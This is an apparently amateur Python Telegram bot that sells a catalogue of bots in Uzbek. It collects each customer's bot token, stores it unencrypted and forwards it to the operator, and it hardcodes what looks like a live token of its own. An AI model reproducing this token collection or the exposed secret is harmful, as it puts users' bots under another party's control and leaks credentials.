"""
BOT STORE UZ - To'liq ishlaydigan versiya
Token + Admin ID so'raydi | Bazaga saqlaydi | Admin'ga xabar yuboradi
"""

import sqlite3
import logging
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode
from telegram import Bot

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

TOKEN = "8666482660:AAHt8ocjlxgTIAbEJF3T1E5ABgT5ugJMNHw"
ADMIN_ID = 6639130930
ADMIN_USERNAME = "@yoldoshev_3"

# Database
conn = sqlite3.connect('botstore.db', check_same_thread=False)
c = conn.cursor()
c.executescript('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, 
        username TEXT, 
        full_name TEXT, 
        balance INTEGER DEFAULT 0
    );
    CREATE TABLE IF NOT EXISTS orders (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        user_id INTEGER, 
        bot_type TEXT, 
        bot_name TEXT, 
        bot_token TEXT, 
        bot_username TEXT,
        admin_id INTEGER, 
        status TEXT DEFAULT 'active',
        start_date TEXT, 
        end_date TEXT, 
        price INTEGER
    );
''')
conn.commit()

# Botlar katalogi
BOTS = {
    "shop": {"name": "🛍 Mini Do'kon Boti", "price": 10000, "desc": "Mahsulotlar, savatcha, buyurtmalar, admin panel"},
    "admin": {"name": "📊 Guruh Boshqaruv Boti", "price": 8000, "desc": "Spam filtr, avto-ban, xush kelibsiz xabari"},
    "quiz": {"name": "🎮 Viktorina Boti", "price": 5000, "desc": "Test yaratish, reyting tizimi, mukofotlar"},
    "reminder": {"name": "📝 Eslatma Boti", "price": 3000, "desc": "Eslatmalar, takrorlash, ovozli eslatma"},
    "weather": {"name": "🌤 Ob-havo Boti", "price": 1000, "desc": "Shaharlar ob-havosi, 7 kunlik prognoz"}
}

# ============ KEYBOARDLAR ============
def main_inline():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🛍 BOTLAR KATALOGI", callback_data="catalog")],
        [InlineKeyboardButton("📦 MENING BOTLARIM", callback_data="my_bots")],
        [InlineKeyboardButton("💰 BALANS", callback_data="balance")],
        [InlineKeyboardButton("🎁 BONUS", callback_data="bonus")],
        [InlineKeyboardButton("📞 ALOQA", callback_data="contact")]
    ])

def main_reply():
    return ReplyKeyboardMarkup([
        ["🛍 KATALOG", "📦 BOTLARIM"],
        ["💰 BALANS", "🎁 BONUS"],
        ["📞 ALOQA"]
    ], resize_keyboard=True)

def back_button(data="catalog"):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ ORQAGA", callback_data=data)],
        [InlineKeyboardButton("🏠 BOSH MENYU", callback_data="start")]
    ])

# ============ START ============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    c.execute("INSERT OR IGNORE INTO users (user_id, username, full_name) VALUES (?, ?, ?)",
              (user.id, user.username, user.full_name))
    conn.commit()
    
    # Oldingi step'larni tozalash
    for key in ['step', 'bot_type', 'token', 'username']:
        if key in context.user_data:
            del context.user_data[key]
    
    text = f"""
🤖 *BOT STORE UZ*

👋 Xush kelibsiz, {user.first_name}!

🔥 *5 ta professional Telegram bot*
✅ *7 kun BEPUL sinov*
💰 *1 000 - 10 000 so'm/kun*

Bot olish uchun katalogdan tanlang!
    """
    
    await update.message.reply_text(text, reply_markup=main_reply(), parse_mode=ParseMode.MARKDOWN)
    await update.message.reply_text("📋 *Menyu:*", reply_markup=main_inline(), parse_mode=ParseMode.MARKDOWN)

# ============ KATALOG ============
async def catalog(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = "🎯 *BOTLAR KATALOGI*\n\n"
    text += "🔥 Barcha botlar 7 kun BEPUL!\n"
    text += "💰 Keyin kunlik to'lov\n\n"
    
    kb = []
    for bid, bot in BOTS.items():
        text += f"{bot['name']}\n"
        text += f"└ {bot['price']:,} so'm/kun\n\n"
        kb.append([InlineKeyboardButton(
            f"{bot['name']} | {bot['price']:,} so'm",
            callback_data=f"info_{bid}"
        )])
    
    kb.append([InlineKeyboardButton("🏠 BOSH MENYU", callback_data="start")])
    
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

# ============ BOT HAQIDA ============
async def bot_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    bid = query.data.replace("info_", "")
    bot = BOTS.get(bid)
    if not bot:
        await query.edit_message_text("❌ Bot topilmadi!")
        return
    
    text = f"""
*{bot['name']}*

📝 *Tavsif:* {bot['desc']}
💰 *Narx:* {bot['price']:,} so'm/kun
🆓 *Bepul:* 7 kun

⚡️ Nima qilmoqchisiz?
    """
    
    kb = [
        [InlineKeyboardButton("🚀 7 KUN BEPUL OLISH", callback_data=f"get_{bid}")],
        [InlineKeyboardButton("💳 SOTIB OLISH", callback_data=f"buy_{bid}")],
        [InlineKeyboardButton("◀️ KATALOG", callback_data="catalog")]
    ]
    
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

# ============ BOTNI OLISH (TOKEN SO'RASH) ============
async def get_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    bid = query.data.replace("get_", "")
    bot = BOTS.get(bid)
    if not bot:
        return
    
    # Oldin olganligini tekshirish
    c.execute("SELECT * FROM orders WHERE user_id = ? AND bot_type = ? AND status = 'active'",
              (update.effective_user.id, bid))
    if c.fetchone():
        await query.edit_message_text(
            "❌ Siz bu botni allaqachon olgansiz!\n\n📦 Mening botlarim bo'limiga o'ting.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📦 BOTLARIM", callback_data="my_bots")]
            ])
        )
        return
    
    context.user_data['bot_type'] = bid
    context.user_data['bot_name'] = bot['name']
    context.user_data['step'] = 'waiting_token'
    
    text = f"""
🔑 *{bot['name']}* - TOKEN KIRITING

*1-QADAM:* @BotFather'ga o'ting
*2-QADAM:* /newbot buyrug'ini bering
*3-QADAM:* Bot yarating
*4-QADAM:* Olingan TOKENni shu yerga yuboring

📝 Token namunasi:
`1234567890:AAHdqTcvCHrT...`

❌ Bekor qilish: /cancel
    """
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ BEKOR QILISH", callback_data="catalog")]
        ]),
        parse_mode=ParseMode.MARKDOWN
    )

# ============ TOKEN QABUL QILISH ============
async def process_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    token = update.message.text.strip()
    
    # Tokenni tekshirish
    if ':' not in token or len(token) < 45:
        await update.message.reply_text(
            "❌ *Noto'g'ri token!*\n\n"
            "Token `1234567890:ABCdef...` ko'rinishida bo'lishi kerak.\n"
            "@BotFather'dan /newbot qiling.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Token bandligini tekshirish
    c.execute("SELECT * FROM orders WHERE bot_token = ?", (token,))
    if c.fetchone():
        await update.message.reply_text(
            "❌ *Bu token band qilingan!*\n\n"
            "@BotFather'dan YANGI bot yarating va yangi token oling.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Tokenni Telegram orqali tekshirish
    msg = await update.message.reply_text("⏳ Token tekshirilmoqda...")
    
    try:
        test_bot = Bot(token=token)
        bot_info = await test_bot.get_me()
        
        context.user_data['token'] = token
        context.user_data['bot_username'] = bot_info.username
        context.user_data['step'] = 'waiting_admin_id'
        
        await msg.delete()
        
        text = f"""
✅ *Token to'g'ri!*

🤖 Bot: @{bot_info.username}

*2-QADAM:* Admin ID'ngizni kiriting

📱 @userinfobot ga /start yozing
🆔 ID raqamingizni oling
📤 Shu yerga yuboring

💡 Masalan: `123456789`
        """
        
        await update.message.reply_text(
            text,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("ℹ️ ID QANDAY OLINADI?", url="https://t.me/userinfobot")],
                [InlineKeyboardButton("❌ BEKOR QILISH", callback_data="catalog")]
            ]),
            parse_mode=ParseMode.MARKDOWN
        )
        
    except Exception as e:
        await msg.delete()
        await update.message.reply_text(
            f"❌ *Token noto'g'ri!*\n\n"
            f"Xatolik: {str(e)[:100]}\n\n"
            f"@BotFather'dan yangi bot yarating.",
            parse_mode=ParseMode.MARKDOWN
        )

# ============ ADMIN ID QABUL QILISH ============
async def process_admin_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        admin_id = int(update.message.text.strip())
    except ValueError:
        await update.message.reply_text(
            "❌ *ID raqam bo'lishi kerak!*\n\n"
            "@userinfobot dan ID oling.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    if admin_id <= 0:
        await update.message.reply_text("❌ Noto'g'ri ID!")
        return
    
    user = update.effective_user
    bot_type = context.user_data['bot_type']
    bot_name = context.user_data['bot_name']
    token = context.user_data['token']
    bot_username = context.user_data['bot_username']
    
    # Bazaga saqlash
    now = datetime.now()
    end = now + timedelta(days=7)
    
    c.execute(
        """INSERT INTO orders 
           (user_id, bot_type, bot_name, bot_token, bot_username, admin_id, start_date, end_date, price) 
           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
        (user.id, bot_type, bot_name, token, bot_username, admin_id,
         now.strftime('%Y-%m-%d'), end.strftime('%Y-%m-%d'), BOTS[bot_type]['price'])
    )
    conn.commit()
    
    # Step'larni tozalash
    for key in ['step', 'bot_type', 'bot_name', 'token', 'bot_username']:
        if key in context.user_data:
            del context.user_data[key]
    
    # Foydalanuvchiga javob
    await update.message.reply_text(
        f"""
✅ *BOT MUVAFFAQIYATLI RO'YXATGA OLINDI!*

🤖 *Bot:* @{bot_username}
📦 *Paket:* {bot_name}
👑 *Admin ID:* `{admin_id}`
📅 *Bepul:* {end.strftime('%d.%m.%Y')} gacha
💰 *Keyin:* {BOTS[bot_type]['price']:,} so'm/kun

⏰ *Endi nima bo'ladi?*
1. Admin botingizni ko'rib chiqadi
2. Kerakli sozlamalarni o'rnatadi
3. 24 soat ichida to'liq ishga tushiradi

📞 Savollar: {ADMIN_USERNAME}
        """,
        reply_markup=main_reply(),
        parse_mode=ParseMode.MARKDOWN
    )
    
    # Admin'ga xabar
    await context.bot.send_message(
        ADMIN_ID,
        f"""
🆕 *YANGI BOT RO'YXATGA OLINDI!*

👤 *Foydalanuvchi:* {user.full_name}
🆔 *User ID:* `{user.id}`
👤 *Username:* @{user.username}

🤖 *Bot:* {bot_name}
🔑 *Token:* `{token}`
🔗 *Username:* @{bot_username}
👑 *Admin ID:* `{admin_id}`

📅 *Boshlanish:* {now.strftime('%d.%m.%Y')}
📅 *Tugash:* {end.strftime('%d.%m.%Y')}
💰 *Narx:* {BOTS[bot_type]['price']:,} so'm/kun

⚡️ Botni tekshirib, ishga tushirish kerak!
        """,
        parse_mode=ParseMode.MARKDOWN
    )
    
    logger.info(f"✅ Yangi bot: User={user.id}, Bot={bot_name}, Admin={admin_id}")

# ============ BUY ============
async def buy_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    bid = query.data.replace("buy_", "")
    bot = BOTS.get(bid)
    if not bot:
        return
    
    text = f"""
💳 *{bot['name']}* - SOTIB OLISH

💰 Narx: {bot['price']:,} so'm/kun

To'lov usullari:
📱 Click: `+998901234567`
💳 Payme: `8600xxxx1234`

To'lov qilib, chek rasmini shu yerga yuboring.
Admin tasdiqlagach, bot faollashadi.
    """
    
    await query.edit_message_text(
        text,
        reply_markup=back_button(f"info_{bid}"),
        parse_mode=ParseMode.MARKDOWN
    )

# ============ MENING BOTLARIM ============
async def my_bots(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    c.execute("SELECT * FROM orders WHERE user_id = ? AND status = 'active' ORDER BY id DESC", (user_id,))
    orders = c.fetchall()
    
    if not orders:
        text = "📦 *Hali botlaringiz yo'q!*\n\nKatalogdan bot tanlang:"
        kb = [[InlineKeyboardButton("🛍 KATALOGGA O'TISH", callback_data="catalog")]]
    else:
        text = "📦 *MENING BOTLARIM*\n\n"
        kb = []
        
        for o in orders:
            try:
                end = datetime.strptime(o[8], '%Y-%m-%d')
                days = (end - datetime.now()).days
            except:
                days = 0
            
            status_emoji = "✅" if days > 0 else "⚠️"
            
            text += f"{status_emoji} *{o[3]}*\n"
            text += f"├ 🤖 @{o[5]}\n"
            text += f"├ 👑 Admin ID: `{o[6]}`\n"
            text += f"├ ⏳ Qolgan: {max(0, days)} kun\n"
            text += f"└ 💰 {o[9]:,} so'm/kun\n\n"
        
        kb.append([InlineKeyboardButton("🛍 YANGI BOT OLISH", callback_data="catalog")])
    
    kb.append([InlineKeyboardButton("🏠 BOSH MENYU", callback_data="start")])
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup(kb),
        parse_mode=ParseMode.MARKDOWN
    )

# ============ BALANS ============
async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query: await query.answer()
    
    c.execute("SELECT balance FROM users WHERE user_id = ?", (update.effective_user.id,))
    user = c.fetchone()
    bal = user[0] if user else 0
    
    text = f"💰 Balans: {bal} so'm\n\n💳 To'ldirish: {ADMIN_USERNAME}"
    
    if query:
        await query.edit_message_text(text, reply_markup=back_button("start"))
    else:
        await update.message.reply_text(text, reply_markup=main_reply())

# ============ BONUS ============
async def bonus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query: await query.answer()
    
    c.execute("UPDATE users SET balance = balance + 100 WHERE user_id = ?", (update.effective_user.id,))
    conn.commit()
    
    text = "🎁 100 so'm bonus qo'shildi!"
    
    if query:
        await query.edit_message_text(text, reply_markup=back_button("start"))
    else:
        await update.message.reply_text(text, reply_markup=main_reply())

# ============ CONTACT ============
async def contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query: await query.answer()
    
    text = f"📞 Admin: {ADMIN_USERNAME}"
    
    if query:
        await query.edit_message_text(text, reply_markup=back_button("start"))
    else:
        await update.message.reply_text(text, reply_markup=main_reply())

# ============ PHOTO (CHEK) ============
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("✅ Chek qabul qilindi! Admin tez orada tasdiqlaydi.")
    try:
        await context.bot.forward_message(ADMIN_ID, update.message.from_user.id, update.message.message_id)
    except:
        pass

# ============ CALLBACK ROUTER ============
async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    
    try:
        await query.answer()
    except:
        pass
    
    logger.info(f"Callback: {data}")
    
    if data == "start":
        await start(update, context)
    elif data == "catalog":
        await catalog(update, context)
    elif data == "my_bots":
        await my_bots(update, context)
    elif data == "balance":
        await balance(update, context)
    elif data == "bonus":
        await bonus(update, context)
    elif data == "contact":
        await contact(update, context)
    elif data.startswith("info_"):
        await bot_info(update, context)
    elif data.startswith("get_"):
        await get_bot(update, context)
    elif data.startswith("buy_"):
        await buy_bot(update, context)

# ============ TEXT ROUTER ============
async def text_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    step = context.user_data.get('step')
    
    logger.info(f"Text: {text}, Step: {step}")
    
    # Token yoki ID kiritish bosqichi
    if step == 'waiting_token':
        await process_token(update, context)
        return
    elif step == 'waiting_admin_id':
        await process_admin_id(update, context)
        return
    
    # Menyu tugmalari
    if text == "🛍 KATALOG":
        await catalog(update, context)
    elif text == "📦 BOTLARIM":
        await my_bots(update, context)
    elif text == "💰 BALANS":
        await balance(update, context)
    elif text == "🎁 BONUS":
        await bonus(update, context)
    elif text == "📞 ALOQA":
        await contact(update, context)
    elif text == "/cancel":
        for k in ['step', 'bot_type', 'bot_name', 'token', 'bot_username']:
            if k in context.user_data:
                del context.user_data[k]
        await update.message.reply_text("❌ Bekor qilindi!", reply_markup=main_reply())
    else:
        await update.message.reply_text(
            "Menyudan foydalaning yoki /start yozing!",
            reply_markup=main_reply()
        )

# ============ MAIN ============
def main():
    logger.info("=" * 50)
    logger.info("🚀 BOT STORE UZ ishga tushmoqda...")
    logger.info(f"👑 Admin ID: {ADMIN_ID}")
    logger.info("=" * 50)
    
    app = Application.builder().token(TOKEN).build()
    
    # Handlerlar
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(callback_router))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_router))
    
    logger.info("✅ Barcha handlerlar yuklandi")
    logger.info("🔥 Bot ishga tushdi! Telegram'da /start yozing!")
    
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
